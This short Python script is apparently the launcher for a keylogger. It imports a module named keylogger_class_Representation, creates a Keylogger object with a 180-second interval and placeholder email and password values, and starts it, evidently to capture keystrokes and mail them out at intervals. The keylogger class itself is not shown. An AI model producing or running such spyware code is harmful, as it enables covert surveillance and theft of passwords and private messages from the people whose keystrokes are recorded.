#! /usr/bin/env python

import keylogger_class_Representation

listener = keylogger_class_Representation.Keylogger(180, "your_email", "password")
listener.start()
